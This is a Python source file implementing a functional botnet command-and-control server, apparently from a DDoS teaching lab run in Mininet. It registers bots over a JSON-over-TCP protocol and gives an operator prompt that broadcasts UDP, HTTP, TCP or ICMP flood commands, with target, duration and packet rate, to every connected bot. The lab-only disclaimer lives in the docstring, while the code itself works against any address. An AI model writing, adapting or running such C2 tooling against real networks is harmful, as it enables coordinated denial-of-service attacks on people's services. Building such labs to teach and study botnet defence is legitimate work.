#!/usr/bin/env python3
"""
C2 (Command-and-Control) server for the Botnet DDoS lab.

Runs on the hidden C2 host (``c2srv``, 10.0.200.10) and listens for bot
connections coming from the per-ISP bot IP ranges -- everything else is
dropped at R-c2 by the iptables ACL installed in ``topology/topo.py``.

Wire protocol
-------------
Line-delimited JSON over TCP. Every message is one UTF-8 JSON object
followed by a single ``\\n``. Defined message types:

    Bot -> C2
        {"type": "register",  "bot_id": "botA1", "ip": "10.0.1.21"}
        {"type": "heartbeat", "bot_id": "botA1", "uptime": 123.4}
        {"type": "ack",       "bot_id": "botA1", "cmd_id": "...",
                              "status": "started"|"stopped"|"error",
                              "detail": "..."}

    C2  -> Bot
        {"type": "attack", "cmd_id": "...", "target": "10.0.100.10",
                           "method": "udp"|"http"|"tcp"|"icmp",
                           "port": 80, "duration": 30, "rate_pps": 200}
        {"type": "stop",   "cmd_id": "..."}
        {"type": "ping"}                # liveness probe
        {"type": "quit"}                # bot disconnects gracefully

Operator CLI
------------
Once the server is up, the operator gets an interactive prompt::

    c2> list
    c2> attack udp 10.0.100.10 30 200
    c2> attack http 10.0.100.10 60 50 --port 80
    c2> stop
    c2> kick botA1
    c2> quit

This script is for use **inside the controlled Mininet VM only**.
"""

from __future__ import annotations

import argparse
import json
import logging
import shlex
import socket
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from typing import Dict, Optional

# ---------------------------------------------------------------------------
# Defaults (must match botnet/bot.py)
# ---------------------------------------------------------------------------
DEFAULT_BIND = "0.0.0.0"
DEFAULT_PORT = 6667
RECV_BUFFER  = 4096
LISTEN_BACKLOG = 128

VALID_METHODS = ("udp", "http", "tcp", "icmp")


# ---------------------------------------------------------------------------
# Bot session bookkeeping
# ---------------------------------------------------------------------------
@dataclass
class BotSession:
    bot_id: str
    addr: str
    sock: socket.socket
    registered_at: float = field(default_factory=time.time)
    last_seen: float     = field(default_factory=time.time)
    lock: threading.Lock = field(default_factory=threading.Lock)

    def send(self, message: dict) -> bool:
        """Send a JSON message; return True on success."""
        line = (json.dumps(message) + "\n").encode("utf-8")
        with self.lock:
            try:
                self.sock.sendall(line)
                return True
            except OSError:
                return False

    def close(self) -> None:
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            self.sock.close()
        except OSError:
            pass


# ---------------------------------------------------------------------------
# C2 server
# ---------------------------------------------------------------------------
class C2Server:
    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self.bots: Dict[str, BotSession] = {}
        self.bots_lock = threading.Lock()
        self._stop = threading.Event()
        self._listener_thread: Optional[threading.Thread] = None
        self._listen_sock: Optional[socket.socket] = None
        self.log = logging.getLogger("c2")

    # -- lifecycle ------------------------------------------------------
    def start(self) -> None:
        self._listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._listen_sock.bind((self.host, self.port))
        self._listen_sock.listen(LISTEN_BACKLOG)
        self.log.info("C2 listening on %s:%d", self.host, self.port)
        self._listener_thread = threading.Thread(
            target=self._accept_loop, name="c2-accept", daemon=True
        )
        self._listener_thread.start()

    def stop(self) -> None:
        self._stop.set()
        if self._listen_sock is not None:
            try:
                self._listen_sock.close()
            except OSError:
                pass
        with self.bots_lock:
            sessions = list(self.bots.values())
            self.bots.clear()
        for s in sessions:
            s.send({"type": "quit"})
            s.close()
        self.log.info("C2 stopped")

    # -- accept / per-client loops -------------------------------------
    def _accept_loop(self) -> None:
        assert self._listen_sock is not None
        while not self._stop.is_set():
            try:
                client, addr = self._listen_sock.accept()
            except OSError:
                if self._stop.is_set():
                    break
                continue
            t = threading.Thread(
                target=self._client_loop,
                args=(client, addr),
                name=f"bot-{addr[0]}",
                daemon=True,
            )
            t.start()

    def _client_loop(self, sock: socket.socket, addr) -> None:
        addr_str = f"{addr[0]}:{addr[1]}"
        session: Optional[BotSession] = None
        buf = b""
        try:
            sock.settimeout(120.0)  # disconnect silent bots
            while not self._stop.is_set():
                chunk = sock.recv(RECV_BUFFER)
                if not chunk:
                    break
                buf += chunk
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    if not line.strip():
                        continue
                    try:
                        msg = json.loads(line.decode("utf-8", "replace"))
                    except json.JSONDecodeError:
                        self.log.warning("bad JSON from %s", addr_str)
                        continue
                    session = self._handle_message(session, sock, addr_str, msg)
        except socket.timeout:
            self.log.info("bot %s timed out", addr_str)
        except OSError as exc:
            self.log.debug("socket error on %s: %s", addr_str, exc)
        finally:
            if session is not None:
                with self.bots_lock:
                    self.bots.pop(session.bot_id, None)
                self.log.info("bot %s disconnected", session.bot_id)
            try:
                sock.close()
            except OSError:
                pass

    def _handle_message(
        self,
        session: Optional[BotSession],
        sock: socket.socket,
        addr_str: str,
        msg: dict,
    ) -> Optional[BotSession]:
        mtype = msg.get("type")

        if mtype == "register":
            bot_id = str(msg.get("bot_id") or f"unknown-{addr_str}")
            session = BotSession(bot_id=bot_id, addr=addr_str, sock=sock)
            with self.bots_lock:
                # Replace any stale session with the same id.
                old = self.bots.pop(bot_id, None)
                self.bots[bot_id] = session
            if old is not None:
                old.close()
            self.log.info(
                "bot REGISTER  %-12s from %-21s ip=%s",
                bot_id, addr_str, msg.get("ip", "?"),
            )
            session.send({"type": "ping"})
            return session

        if session is None:
            self.log.warning("unregistered message from %s: %s", addr_str, mtype)
            return None

        session.last_seen = time.time()

        if mtype == "heartbeat":
            self.log.debug("HB %s uptime=%.1f", session.bot_id,
                           float(msg.get("uptime", 0)))
        elif mtype == "ack":
            self.log.info(
                "ack    %-10s cmd=%s status=%s detail=%s",
                session.bot_id, msg.get("cmd_id", "?"),
                msg.get("status", "?"), msg.get("detail", ""),
            )
        else:
            self.log.warning("unknown msg type %r from %s", mtype, session.bot_id)

        return session

    # -- broadcast helpers --------------------------------------------
    def broadcast(self, message: dict) -> int:
        """Send *message* to every connected bot. Returns delivery count."""
        with self.bots_lock:
            sessions = list(self.bots.values())
        delivered = 0
        for s in sessions:
            if s.send(message):
                delivered += 1
        return delivered

    def send_to(self, bot_id: str, message: dict) -> bool:
        with self.bots_lock:
            s = self.bots.get(bot_id)
        return bool(s and s.send(message))

    def list_bots(self):
        with self.bots_lock:
            return [
                (s.bot_id, s.addr, time.time() - s.registered_at,
                 time.time() - s.last_seen)
                for s in self.bots.values()
            ]


# ---------------------------------------------------------------------------
# Operator CLI
# ---------------------------------------------------------------------------
HELP_TEXT = """\
Commands:
  list                                        show connected bots
  attack <method> <target> <duration> [rate]  start an attack on all bots
                                              method = udp | http | tcp | icmp
                                              rate   = packets per second per bot
                                              optional: --port N
  stop                                        stop the current attack
  kick <bot_id>                               disconnect one bot
  ping                                        liveness probe to all bots
  help                                        this help text
  quit                                        shut down the C2 server
"""


def _parse_attack_args(parts):
    """parts already excludes the leading 'attack' token."""
    if len(parts) < 3:
        raise ValueError("usage: attack <method> <target> <duration> [rate] [--port N]")
    method   = parts[0].lower()
    target   = parts[1]
    duration = int(parts[2])
    rate     = int(parts[3]) if len(parts) >= 4 and not parts[3].startswith("--") else 200
    port     = None
    for i, tok in enumerate(parts):
        if tok == "--port" and i + 1 < len(parts):
            port = int(parts[i + 1])
    if method not in VALID_METHODS:
        raise ValueError(f"method must be one of {VALID_METHODS}")
    return method, target, duration, rate, port


def operator_cli(server: C2Server) -> None:
    print("C2 ready. Type 'help' for commands.\n")
    while True:
        try:
            line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        try:
            parts = shlex.split(line)
        except ValueError as exc:
            print(f"parse error: {exc}")
            continue
        cmd, *args = parts
        cmd = cmd.lower()

        if cmd in ("quit", "exit"):
            break
        if cmd == "help":
            print(HELP_TEXT)
            continue
        if cmd == "list":
            rows = server.list_bots()
            if not rows:
                print("(no bots connected)")
                continue
            print(f"{'bot_id':<12} {'addr':<22} {'age(s)':>8} {'idle(s)':>8}")
            for bot_id, addr, age, idle in sorted(rows):
                print(f"{bot_id:<12} {addr:<22} {age:>8.1f} {idle:>8.1f}")
            print(f"-- {len(rows)} bot(s) --")
            continue
        if cmd == "ping":
            n = server.broadcast({"type": "ping"})
            print(f"ping sent to {n} bot(s)")
            continue
        if cmd == "stop":
            cmd_id = uuid.uuid4().hex[:8]
            n = server.broadcast({"type": "stop", "cmd_id": cmd_id})
            print(f"stop ({cmd_id}) sent to {n} bot(s)")
            continue
        if cmd == "kick":
            if not args:
                print("usage: kick <bot_id>")
                continue
            ok = server.send_to(args[0], {"type": "quit"})
            print("ok" if ok else "no such bot")
            continue
        if cmd == "attack":
            try:
                method, target, duration, rate, port = _parse_attack_args(args)
            except ValueError as exc:
                print(exc)
                continue
            cmd_id = uuid.uuid4().hex[:8]
            payload = {
                "type": "attack",
                "cmd_id": cmd_id,
                "method": method,
                "target": target,
                "duration": duration,
                "rate_pps": rate,
            }
            if port is not None:
                payload["port"] = port
            n = server.broadcast(payload)
            print(f"attack ({cmd_id}) {method} {target} dur={duration}s "
                  f"rate={rate} pps -> {n} bot(s)")
            continue

        print(f"unknown command: {cmd!r}  (type 'help')")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def _setup_logging(verbosity: str, log_file: Optional[str]) -> None:
    level = getattr(logging, verbosity.upper(), logging.INFO)
    handlers: list[logging.Handler] = [logging.StreamHandler(sys.stderr)]
    if log_file:
        handlers.append(logging.FileHandler(log_file))
    logging.basicConfig(
        level=level,
        format="%(asctime)s %(levelname)-7s %(name)s | %(message)s",
        datefmt="%H:%M:%S",
        handlers=handlers,
    )


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__.split("\n", 1)[0])
    p.add_argument("--bind", default=DEFAULT_BIND,
                   help="address to bind (default: %(default)s)")
    p.add_argument("--port", type=int, default=DEFAULT_PORT,
                   help="TCP port to listen on (default: %(default)s)")
    p.add_argument("--log-file", default=None,
                   help="also write log lines to this file")
    p.add_argument("--log-level", default="info",
                   choices=["debug", "info", "warning", "error"])
    p.add_argument("--no-cli", action="store_true",
                   help="run headless (no operator prompt)")
    args = p.parse_args()

    _setup_logging(args.log_level, args.log_file)

    server = C2Server(args.bind, args.port)
    server.start()

    try:
        if args.no_cli:
            while True:
                time.sleep(3600)
        else:
            operator_cli(server)
    except KeyboardInterrupt:
        pass
    finally:
        server.stop()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
